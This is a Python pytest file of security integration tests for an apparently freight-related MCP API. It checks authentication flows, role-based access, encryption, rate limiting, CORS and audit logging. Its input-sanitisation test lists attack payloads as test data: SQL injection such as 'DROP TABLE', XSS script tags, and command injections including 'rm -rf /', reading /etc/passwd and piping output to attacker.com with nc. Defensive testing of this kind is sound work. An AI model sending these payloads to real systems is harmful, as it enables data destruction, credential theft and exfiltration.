"""
Security integration tests for MCP API
"""
import pytest
import jwt
import json
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock
import hashlib
import base64
from cryptography.fernet import Fernet

# Import test utilities
from ..conftest import *


class TestAuthenticationIntegration:
    """Test authentication mechanisms"""
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    async def test_jwt_authentication_flow(self, client, mock_auth_service):
        """Test complete JWT authentication flow"""
        # Step 1: Login with credentials
        login_data = {
            "username": "test_user",
            "password": "secure_password123"
        }
        
        mock_auth_service.authenticate.return_value = {
            "user_id": "user_123",
            "roles": ["freight_manager", "api_user"]
        }
        
        mock_auth_service.generate_tokens.return_value = {
            "access_token": "mock_access_token",
            "refresh_token": "mock_refresh_token",
            "expires_in": 3600
        }
        
        response = await client.post("/api/auth/login", json=login_data)
        assert response.status_code == 200
        
        tokens = response.json()
        assert "access_token" in tokens
        assert "refresh_token" in tokens
        
        # Step 2: Access protected endpoint with token
        headers = {"Authorization": f"Bearer {tokens['access_token']}"}
        response = await client.get("/api/mcp/protected/tools", headers=headers)
        assert response.status_code == 200
        
        # Step 3: Test token refresh
        refresh_data = {"refresh_token": tokens["refresh_token"]}
        response = await client.post("/api/auth/refresh", json=refresh_data)
        assert response.status_code == 200
        
        new_tokens = response.json()
        assert new_tokens["access_token"] != tokens["access_token"]
        
        # Step 4: Test logout
        response = await client.post(
            "/api/auth/logout",
            headers=headers,
            json={"refresh_token": tokens["refresh_token"]}
        )
        assert response.status_code == 200
        
        # Step 5: Verify old token is invalidated
        response = await client.get("/api/mcp/protected/tools", headers=headers)
        assert response.status_code == 401
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    async def test_api_key_authentication(self, client, mock_auth_service):
        """Test API key authentication"""
        # Create API key
        mock_auth_service.create_api_key.return_value = {
            "api_key": "mcp_live_sk_test123456789",
            "key_id": "key_001",
            "created_at": datetime.utcnow().isoformat()
        }
        
        response = await client.post(
            "/api/auth/api-keys",
            json={
                "name": "Test Integration Key",
                "scopes": ["tools:read", "tools:execute"],
                "expires_in_days": 90
            },
            headers={"Authorization": "Bearer valid_token"}
        )
        assert response.status_code == 201
        api_key_data = response.json()
        
        # Use API key for authentication
        headers = {"X-API-Key": api_key_data["api_key"]}
        response = await client.get("/api/mcp/tools", headers=headers)
        assert response.status_code == 200
        
        # Test invalid API key
        headers = {"X-API-Key": "invalid_key"}
        response = await client.get("/api/mcp/tools", headers=headers)
        assert response.status_code == 401
        
        # Test rate limiting for API key
        valid_headers = {"X-API-Key": api_key_data["api_key"]}
        for i in range(105):  # Assuming 100 req/hour limit
            response = await client.get("/api/mcp/tools", headers=valid_headers)
            if response.status_code == 429:
                break
        
        assert response.status_code == 429
        assert "X-RateLimit-Remaining" in response.headers
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    async def test_oauth2_flow(self, client, mock_auth_service):
        """Test OAuth2 authorization code flow"""
        # Step 1: Authorization request
        auth_params = {
            "response_type": "code",
            "client_id": "test_client_id",
            "redirect_uri": "http://localhost:3000/callback",
            "scope": "freight:read freight:write",
            "state": "random_state_123"
        }
        
        response = await client.get(
            "/api/auth/oauth/authorize",
            params=auth_params
        )
        assert response.status_code == 302  # Redirect to login
        
        # Step 2: User login (simulated)
        mock_auth_service.authorize_client.return_value = {
            "authorization_code": "auth_code_123",
            "expires_in": 600
        }
        
        # Step 3: Exchange code for token
        token_data = {
            "grant_type": "authorization_code",
            "code": "auth_code_123",
            "client_id": "test_client_id",
            "client_secret": "test_client_secret",
            "redirect_uri": "http://localhost:3000/callback"
        }
        
        mock_auth_service.exchange_code.return_value = {
            "access_token": "oauth_access_token",
            "token_type": "Bearer",
            "expires_in": 3600,
            "refresh_token": "oauth_refresh_token",
            "scope": "freight:read freight:write"
        }
        
        response = await client.post("/api/auth/oauth/token", data=token_data)
        assert response.status_code == 200
        oauth_tokens = response.json()
        assert oauth_tokens["token_type"] == "Bearer"
        
        # Step 4: Use OAuth token
        headers = {"Authorization": f"Bearer {oauth_tokens['access_token']}"}
        response = await client.get("/api/mcp/tools", headers=headers)
        assert response.status_code == 200


class TestAuthorizationIntegration:
    """Test authorization and permission checks"""
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    async def test_role_based_access_control(self, client, mock_auth_service):
        """Test RBAC implementation"""
        # Define test users with different roles
        test_users = [
            {
                "token": "admin_token",
                "user": {"id": "admin_1", "roles": ["admin"]},
                "permissions": ["*"]
            },
            {
                "token": "manager_token",
                "user": {"id": "manager_1", "roles": ["freight_manager"]},
                "permissions": ["freight:*", "tools:read", "tools:execute"]
            },
            {
                "token": "viewer_token",
                "user": {"id": "viewer_1", "roles": ["viewer"]},
                "permissions": ["freight:read", "tools:read"]
            }
        ]
        
        # Mock auth service to return appropriate user based on token
        def get_user_by_token(token):
            for user in test_users:
                if f"Bearer {user['token']}" in token:
                    return user["user"], user["permissions"]
            return None, []
        
        mock_auth_service.validate_token.side_effect = lambda t: get_user_by_token(t)
        
        # Test admin access (should access everything)
        admin_headers = {"Authorization": "Bearer admin_token"}
        response = await client.post(
            "/api/mcp/admin/tools/create",
            json={"name": "new_tool", "config": {}},
            headers=admin_headers
        )
        assert response.status_code in [200, 201]
        
        # Test manager access (should access freight operations)
        manager_headers = {"Authorization": "Bearer manager_token"}
        response = await client.post(
            "/api/mcp/tools/calculate_freight/execute",
            json={"origin": "SP", "destination": "RJ"},
            headers=manager_headers
        )
        assert response.status_code == 200
        
        # Manager should NOT access admin endpoints
        response = await client.post(
            "/api/mcp/admin/tools/create",
            json={"name": "new_tool", "config": {}},
            headers=manager_headers
        )
        assert response.status_code == 403
        
        # Test viewer access (read-only)
        viewer_headers = {"Authorization": "Bearer viewer_token"}
        response = await client.get("/api/mcp/tools", headers=viewer_headers)
        assert response.status_code == 200
        
        # Viewer should NOT execute tools
        response = await client.post(
            "/api/mcp/tools/calculate_freight/execute",
            json={"origin": "SP", "destination": "RJ"},
            headers=viewer_headers
        )
        assert response.status_code == 403
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    async def test_resource_level_permissions(self, flask_client, auth_headers, mock_portfolio_bridge):
        """Test resource-level permission checks"""
        # Setup workspace permissions
        mock_portfolio_bridge.check_workspace_permission.side_effect = lambda user_id, workspace_id, permission: (
            workspace_id in ["workspace_1", "workspace_2"] if user_id == "user_123" else False
        )
        
        # User can access workspace_1
        response = flask_client.get(
            "/api/portfolio/mcp/workspaces/workspace_1/orders",
            headers=auth_headers
        )
        assert response.status_code == 200
        
        # User cannot access workspace_3
        response = flask_client.get(
            "/api/portfolio/mcp/workspaces/workspace_3/orders",
            headers=auth_headers
        )
        assert response.status_code == 403
        
        # Test order-level permissions
        mock_portfolio_bridge.check_order_permission.side_effect = lambda user_id, order_id, permission: (
            order_id.startswith("ORD-WS1") if user_id == "user_123" else False
        )
        
        # Can update own workspace's order
        response = flask_client.patch(
            "/api/portfolio/mcp/orders/ORD-WS1-001",
            json={"status": "processing"},
            headers=auth_headers
        )
        assert response.status_code == 200
        
        # Cannot update other workspace's order
        response = flask_client.patch(
            "/api/portfolio/mcp/orders/ORD-WS3-001",
            json={"status": "processing"},
            headers=auth_headers
        )
        assert response.status_code == 403


class TestDataSecurityIntegration:
    """Test data encryption and security measures"""
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    def test_sensitive_data_encryption(self, db_session, encryption_key):
        """Test encryption of sensitive data in database"""
        # Create encryption cipher
        cipher = Fernet(encryption_key)
        
        # Create table with encrypted columns
        db_session.execute(text("""
            CREATE TABLE IF NOT EXISTS sensitive_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT NOT NULL,
                data_type TEXT NOT NULL,
                encrypted_value TEXT NOT NULL,
                iv TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """))
        db_session.commit()
        
        # Test data to encrypt
        sensitive_items = [
            ("user_123", "api_key", "sk_live_secret123456"),
            ("user_123", "credit_card", "4111111111111111"),
            ("user_456", "ssn", "123-45-6789")
        ]
        
        # Encrypt and store
        for user_id, data_type, value in sensitive_items:
            encrypted = cipher.encrypt(value.encode())
            db_session.execute(text("""
                INSERT INTO sensitive_data (user_id, data_type, encrypted_value)
                VALUES (:user_id, :data_type, :encrypted)
            """), {
                "user_id": user_id,
                "data_type": data_type,
                "encrypted": encrypted.decode()
            })
        db_session.commit()
        
        # Retrieve and decrypt
        result = db_session.execute(text("""
            SELECT encrypted_value FROM sensitive_data
            WHERE user_id = :user_id AND data_type = :data_type
        """), {
            "user_id": "user_123",
            "data_type": "api_key"
        }).scalar()
        
        decrypted = cipher.decrypt(result.encode()).decode()
        assert decrypted == "sk_live_secret123456"
        
        # Verify data is not readable without key
        raw_data = db_session.execute(text("""
            SELECT encrypted_value FROM sensitive_data
        """)).fetchall()
        
        for row in raw_data:
            assert "sk_live" not in row.encrypted_value
            assert "4111" not in row.encrypted_value
            assert "123-45" not in row.encrypted_value
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    async def test_input_sanitization(self, client):
        """Test input sanitization against injection attacks"""
        # Test SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; UPDATE users SET role='admin' WHERE id=1; --"
        ]
        
        for malicious_input in malicious_inputs:
            response = await client.post(
                "/api/mcp/query",
                json={"query": malicious_input}
            )
            # Should handle gracefully, not execute SQL
            assert response.status_code in [200, 400]
            if response.status_code == 200:
                result = response.json()
                # Should be processed as text, not SQL
                assert "error" not in result or "SQL" not in result.get("error", "")
        
        # Test XSS attempts
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>"
        ]
        
        for xss_payload in xss_payloads:
            response = await client.post(
                "/api/mcp/tools/message/execute",
                json={"message": xss_payload}
            )
            
            if response.status_code == 200:
                result = response.json()
                # Verify script tags are escaped
                if "result" in result and isinstance(result["result"], str):
                    assert "<script>" not in result["result"]
                    assert "javascript:" not in result["result"]
        
        # Test command injection attempts
        command_payloads = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "`whoami`"
        ]
        
        for cmd_payload in command_payloads:
            response = await client.post(
                "/api/mcp/tools/process/execute",
                json={"command": cmd_payload}
            )
            # Should reject or sanitize dangerous commands
            assert response.status_code in [400, 403]
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    async def test_rate_limiting_security(self, client):
        """Test rate limiting for security"""
        # Test login rate limiting (prevent brute force)
        login_endpoint = "/api/auth/login"
        failed_attempts = 0
        
        for i in range(10):
            response = await client.post(
                login_endpoint,
                json={"username": "test", "password": f"wrong_{i}"}
            )
            if response.status_code == 429:
                failed_attempts = i
                break
        
        # Should be rate limited before 10 attempts
        assert failed_attempts < 10
        assert response.status_code == 429
        
        # Check rate limit headers
        assert "X-RateLimit-Limit" in response.headers
        assert int(response.headers["X-RateLimit-Remaining"]) == 0
        
        # Test API endpoint rate limiting by IP
        api_endpoint = "/api/mcp/tools"
        requests_before_limit = 0
        
        for i in range(150):  # Assuming 100/hour limit
            response = await client.get(api_endpoint)
            if response.status_code == 429:
                requests_before_limit = i
                break
        
        assert requests_before_limit > 0
        assert requests_before_limit <= 100
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    async def test_cors_security(self, client):
        """Test CORS security configuration"""
        # Test preflight request
        response = await client.options(
            "/api/mcp/tools",
            headers={
                "Origin": "https://trusted-domain.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type,Authorization"
            }
        )
        
        assert response.status_code == 200
        assert "Access-Control-Allow-Origin" in response.headers
        assert "Access-Control-Allow-Methods" in response.headers
        assert "POST" in response.headers["Access-Control-Allow-Methods"]
        
        # Test untrusted origin
        response = await client.options(
            "/api/mcp/tools",
            headers={
                "Origin": "https://malicious-site.com",
                "Access-Control-Request-Method": "POST"
            }
        )
        
        # Should not allow untrusted origins
        if "Access-Control-Allow-Origin" in response.headers:
            assert response.headers["Access-Control-Allow-Origin"] != "https://malicious-site.com"
    
    @pytest.mark.integration
    @pytest.mark.mcp
    @pytest.mark.security
    def test_audit_logging_security(self, db_session):
        """Test security audit logging"""
        # Create security audit table
        db_session.execute(text("""
            CREATE TABLE IF NOT EXISTS security_audit_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                event_type TEXT NOT NULL,
                user_id TEXT,
                ip_address TEXT,
                user_agent TEXT,
                resource TEXT,
                action TEXT,
                result TEXT,
                details JSON,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """))
        db_session.commit()
        
        # Log security events
        security_events = [
            {
                "event_type": "login_attempt",
                "user_id": "user_123",
                "ip_address": "192.168.1.100",
                "action": "login",
                "result": "success",
                "details": '{"method": "password"}'
            },
            {
                "event_type": "login_attempt",
                "user_id": "unknown",
                "ip_address": "10.0.0.50",
                "action": "login",
                "result": "failed",
                "details": '{"reason": "invalid_credentials", "attempts": 3}'
            },
            {
                "event_type": "permission_denied",
                "user_id": "user_456",
                "ip_address": "192.168.1.101",
                "resource": "/api/admin/users",
                "action": "DELETE",
                "result": "denied",
                "details": '{"required_role": "admin", "user_roles": ["viewer"]}'
            },
            {
                "event_type": "suspicious_activity",
                "user_id": None,
                "ip_address": "45.67.89.10",
                "action": "scan",
                "result": "blocked",
                "details": '{"pattern": "automated_scan", "requests_per_min": 500}'
            }
        ]
        
        for event in security_events:
            db_session.execute(text("""
                INSERT INTO security_audit_log 
                (event_type, user_id, ip_address, resource, action, result, details)
                VALUES 
                (:event_type, :user_id, :ip_address, :resource, :action, :result, :details)
            """), event)
        db_session.commit()
        
        # Query security incidents
        failed_logins = db_session.execute(text("""
            SELECT COUNT(*), ip_address
            FROM security_audit_log
            WHERE event_type = 'login_attempt' AND result = 'failed'
            GROUP BY ip_address
            HAVING COUNT(*) >= 3
        """)).fetchall()
        
        assert len(failed_logins) > 0
        
        # Check for suspicious patterns
        suspicious = db_session.execute(text("""
            SELECT * FROM security_audit_log
            WHERE event_type = 'suspicious_activity'
            OR (event_type = 'login_attempt' AND result = 'failed' AND user_id IS NULL)
        """)).fetchall()
        
        assert len(suspicious) > 0